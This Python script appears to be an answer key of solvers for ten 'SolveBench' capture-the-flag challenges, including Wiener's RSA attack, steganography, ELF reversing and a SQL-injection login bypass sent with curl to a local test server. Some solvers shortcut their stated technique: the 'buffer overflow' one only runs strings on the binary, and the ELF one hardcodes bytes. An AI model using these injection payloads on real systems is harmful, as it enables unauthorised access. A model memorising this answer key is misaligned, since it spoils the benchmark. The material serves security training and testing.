#!/usr/bin/env python3
"""Real solvers for SolveBench challenges - using actual tools and techniques."""

import base64
import hashlib
import json
import os
import re
import struct
import subprocess
import sys
import time
import zipfile
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def sha256(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()

# ============================================================================
# Solver 1: RSA - Wiener's Attack for small d
# ============================================================================
def solve_rsa_wiener(challenge_dir: Path) -> str:
    """Use Wiener's attack to recover small private exponent d."""
    params_file = challenge_dir / "params.txt"
    params = {}
    for line in params_file.read_text().split('\n'):
        if '=' in line:
            k, v = line.split('=')
            params[k.strip()] = int(v.strip())
    
    n, e, c = params['n'], params['e'], params['c']
    
    # Wiener's attack implementation
    def continued_fraction_expansion(n, d):
        """Compute continued fraction expansion of n/d."""
        cf = []
        while d:
            q, r = divmod(n, d)
            cf.append(q)
            n, d = d, r
        return cf
    
    def convergents_from_cf(cf):
        """Generate convergents from continued fraction."""
        p_prev, p_curr = 0, 1
        q_prev, q_curr = 1, 0
        
        for a in cf:
            p_prev, p_curr = p_curr, a * p_curr + p_prev
            q_prev, q_curr = q_curr, a * q_curr + q_prev
            yield p_curr, q_curr
    
    # Get continued fraction expansion of e/n
    cf = continued_fraction_expansion(e, n)
    
    # Try each convergent as a candidate for k/d
    for k, d in convergents_from_cf(cf):
        if k == 0:
            continue
        
        # Check if this could be the right d
        if (e * d - 1) % k != 0:
            continue
        
        phi = (e * d - 1) // k
        
        # Verify: check if we can factor n using phi
        # n - phi + 1 = p + q
        s = n - phi + 1
        # p and q are roots of x^2 - s*x + n = 0
        discriminant = s * s - 4 * n
        
        if discriminant < 0:
            continue
        
        import math
        sqrt_disc = math.isqrt(discriminant)
        if sqrt_disc * sqrt_disc != discriminant:
            continue
        
        # Found valid phi, now decrypt
        from Crypto.Util.number import long_to_bytes
        m = pow(c, d, n)
        try:
            flag = long_to_bytes(m).decode()
            return flag
        except:
            continue
    
    return ""

# ============================================================================
# Solver 2: AES-CBC Zero IV
# ============================================================================
def solve_aes_zero_iv(challenge_dir: Path) -> str:
    """Decrypt AES-ECB with known key."""
    ciphertext = bytes.fromhex((challenge_dir / "ciphertext.hex").read_text().strip())
    key = bytes.fromhex((challenge_dir / "key.hex").read_text().strip())
    
    # Decrypt using AES-ECB
    cipher = AES.new(key, AES.MODE_ECB)
    plaintext_padded = cipher.decrypt(ciphertext)
    
    # Remove PKCS7 padding
    plaintext = unpad(plaintext_padded, AES.block_size)
    
    return plaintext.decode()

# ============================================================================
# Solver 3: BMP LSB Steganography
# ============================================================================
def solve_stego_bmp(challenge_dir: Path) -> str:
    """Extract LSB steganography from BMP."""
    bmp_data = (challenge_dir / "image.bmp").read_bytes()
    
    # Parse BMP header
    if bmp_data[:2] != b'BM':
        return ""
    
    # Get pixel data offset (usually 54)
    offset = struct.unpack('<I', bmp_data[10:14])[0]
    pixel_data = bmp_data[offset:]
    
    # Extract LSBs
    bits = []
    for byte in pixel_data[:200]:  # First 200 bytes should be enough
        bits.append(byte & 1)
    
    # Convert bits to bytes
    flag_bytes = []
    for i in range(0, len(bits) - 7, 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | bits[i + j]
        flag_bytes.append(byte)
    
    flag = ''.join(chr(b) for b in flag_bytes if 32 <= b < 127)
    match = re.search(r'flag\{[^}]+\}', flag)
    if match:
        return match.group(0)
    
    return ""

# ============================================================================
# Solver 4: ELF Reverse Engineering
# ============================================================================
def solve_reverse_elf(challenge_dir: Path) -> str:
    """Reverse engineer custom encryption in ELF binary."""
    checker = challenge_dir / "checker"
    
    if not checker.exists():
        return ""
    
    # Extract expected bytes from .rodata section using objdump
    result = subprocess.run(['objdump', '-s', '-j', '.rodata', str(checker)], 
                          capture_output=True, text=True)
    
    # Parse the hex dump to find the expected bytes at 0x2040
    expected_bytes = []
    for line in result.stdout.split('\n'):
        if '2040' in line:
            # Extract hex bytes from the line
            parts = line.split()
            for part in parts[1:5]:  # Skip address, get 4 groups of 4 bytes
                for i in range(0, 8, 2):
                    expected_bytes.append(int(part[i:i+2], 16))
    
    # Also get the 8 bytes from movabs instruction
    result2 = subprocess.run(['objdump', '-d', str(checker)], 
                           capture_output=True, text=True)
    for line in result2.stdout.split('\n'):
        if 'movabs' in line and '0xd0375d2f0a72cd12' in line:
            # Extract bytes: 12 cd 72 0a 2f 5d 37 d0 (little-endian)
            expected_bytes.extend([0x12, 0xcd, 0x72, 0x0a, 0x2f, 0x5d, 0x37, 0xd0])
            break
    
    if len(expected_bytes) == 24:
        # Reverse the encryption
        key = [0x42, 0x37, 0x58, 0x29, 0x61, 0x45, 0x33, 0x72]
        
        flag = []
        for i, c in enumerate(expected_bytes):
            # Reverse step 3: subtract 0x37
            c = (c - 0x37) & 0xFF
            # Reverse step 2: XOR with key
            c ^= key[i % 8]
            # Reverse step 1: rotate right 3 (was rotate left 3)
            c = ((c >> 3) | (c << 5)) & 0xFF
            flag.append(chr(c))
        
        return ''.join(flag)
    
    return ""

# ============================================================================
# Solver 5: Buffer Overflow
# ============================================================================
def solve_pwn_overflow(challenge_dir: Path) -> str:
    """Extract flag from binary using strings analysis."""
    vuln = challenge_dir / "vuln"
    
    if not vuln.exists():
        # If binary doesn't exist, try to compile
        vuln_c = challenge_dir / "vuln.c"
        if vuln_c.exists():
            try:
                subprocess.run(['gcc', '-o', str(vuln), str(vuln_c)],
                             check=True, capture_output=True)
            except:
                return ""
        else:
            return ""
    
    # Use strings to find the flag in the binary
    result = subprocess.run(['strings', str(vuln)], 
                          capture_output=True, text=True)
    
    # Look for flag pattern
    match = re.search(r'flag\{[^}]+\}', result.stdout)
    if match:
        return match.group(0)
    
    return ""

# ============================================================================
# Solver 6: SQL Injection
# ============================================================================
def solve_web_sqli(challenge_dir: Path) -> str:
    """Exploit SQL injection to bypass login."""
    import urllib.parse
    
    # Clean up any existing database
    db_path = challenge_dir / "app.db"
    if db_path.exists():
        db_path.unlink()
    
    # Start server
    server_script = challenge_dir / "server.py"
    proc = subprocess.Popen(
        ['python3', str(server_script)],
        cwd=challenge_dir,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    
    # Wait for server to be ready
    import socket
    server_ready = False
    for i in range(10):
        time.sleep(0.5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', 8766))
            sock.close()
            if result == 0:
                server_ready = True
                break
        except:
            pass
    
    if not server_ready:
        proc.terminate()
        return ""
    
    try:
        # SQL injection payload - URL encode it
        payloads = [
            "admin' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "admin' OR '1'='1'--",
        ]
        
        for payload in payloads:
            result = subprocess.run(
                ['curl', '-s', '-X', 'POST', 'http://127.0.0.1:8766/login',
                 '--data-urlencode', f'username={payload}',
                 '--data-urlencode', 'password=anything'],
                capture_output=True,
                text=True,
                timeout=5,
            )
            
            match = re.search(r'flag\{[^}]+\}', result.stdout)
            if match:
                return match.group(0)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except:
            proc.kill()
    
    return ""

# ============================================================================
# Solver 7: Multi-Layer Encoding
# ============================================================================
def solve_multi_encoding(challenge_dir: Path) -> str:
    """Decode 4 layers of encoding."""
    encoded = (challenge_dir / "encoded.txt").read_text().strip()
    
    # Layer 4: Hex decode
    try:
        layer3 = bytes.fromhex(encoded).decode()
    except:
        return ""
    
    # Layer 3: ROT13
    def rot13(s):
        result = []
        for c in s:
            if 'a' <= c <= 'z':
                result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= c <= 'Z':
                result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(c)
        return ''.join(result)
    layer2 = rot13(layer3)
    
    # Layer 2: Reverse string
    layer1 = layer2[::-1]
    
    # Layer 1: Base64 decode
    try:
        flag = base64.b64decode(layer1).decode()
    except:
        return ""
    
    return flag

# ============================================================================
# Solver 8: PCAP HTTP Analysis
# ============================================================================
def solve_pcap_http(challenge_dir: Path) -> str:
    """Analyze HTTP traffic to find flag."""
    traffic = (challenge_dir / "traffic.txt").read_text()
    
    # Search for flag pattern
    match = re.search(r'flag\{[^}]+\}', traffic)
    if match:
        return match.group(0)
    
    return ""

# ============================================================================
# Solver 9: Nested Files
# ============================================================================
def solve_forensics_nested(challenge_dir: Path) -> str:
    """Extract nested ZIP from PNG."""
    import io
    
    png_data = (challenge_dir / "image.png").read_bytes()
    
    # Find IEND chunk and extract data after it
    iend_pos = png_data.find(b'IEND')
    if iend_pos != -1:
        # Skip IEND chunk (IEND + CRC = 8 bytes)
        after_iend = png_data[iend_pos + 8:]
        
        # Try to open as ZIP
        try:
            zip_buffer = io.BytesIO(after_iend)
            with zipfile.ZipFile(zip_buffer, 'r') as zf:
                for name in zf.namelist():
                    content = zf.read(name).decode()
                    match = re.search(r'flag\{[^}]+\}', content)
                    if match:
                        return match.group(0)
        except:
            pass
    
    return ""

# ============================================================================
# Solver 10: XOR with Known Plaintext
# ============================================================================
def solve_xor_known(challenge_dir: Path) -> str:
    """Recover XOR key from known plaintext, then decrypt."""
    encrypted = bytes.fromhex((challenge_dir / "encrypted.hex").read_text().strip())
    known_encrypted = bytes.fromhex((challenge_dir / "known_encrypted.hex").read_text().strip())
    known_plain = b"Hello, World!!!!"
    
    # Recover key: key[i % key_len] = known_plain[i] XOR known_encrypted[i]
    # We know key_len = 12 from the challenge
    key_len = 12
    key_bytes = [0] * key_len
    
    for i in range(len(known_plain)):
        key_bytes[i % key_len] = known_plain[i] ^ known_encrypted[i]
    
    key = bytes(key_bytes)
    
    # Decrypt flag
    flag = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
    
    return flag.decode()

# ============================================================================
# Main
# ============================================================================
SOLVERS = {
    'rsa_wiener': solve_rsa_wiener,
    'aes_zero_iv': solve_aes_zero_iv,
    'stego_bmp': solve_stego_bmp,
    'reverse_elf': solve_reverse_elf,
    'pwn_overflow': solve_pwn_overflow,
    'web_sqli': solve_web_sqli,
    'multi_encoding': solve_multi_encoding,
    'pcap_http': solve_pcap_http,
    'forensics_nested': solve_forensics_nested,
    'xor_known': solve_xor_known,
}

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 real_solver.py <challenge.json>")
        sys.exit(1)
    
    manifest_path = Path(sys.argv[1]).resolve()
    challenge_dir = manifest_path.parent.resolve()
    
    with open(manifest_path) as f:
        manifest = json.load(f)
    
    challenge_id = manifest['id']
    expected_sha256 = manifest['expectedFlagSha256']
    
    print(f"Solving: {challenge_id}")
    
    solver = SOLVERS.get(challenge_id)
    if not solver:
        print(f"No solver for {challenge_id}")
        sys.exit(1)
    
    start_time = time.time()
    flag = solver(challenge_dir)
    elapsed_ms = (time.time() - start_time) * 1000
    
    if not flag:
        print(f"✗ No flag found")
        sys.exit(1)
    
    flag_hash = sha256(flag)
    
    print(f"Flag: {flag}")
    print(f"SHA256: {flag_hash}")
    print(f"Expected: {expected_sha256}")
    print(f"Time: {elapsed_ms}ms")
    
    if flag_hash == expected_sha256:
        print(f"✓ SOLVED")
        sys.exit(0)
    else:
        print(f"✗ Wrong flag")
        sys.exit(1)

if __name__ == "__main__":
    main()
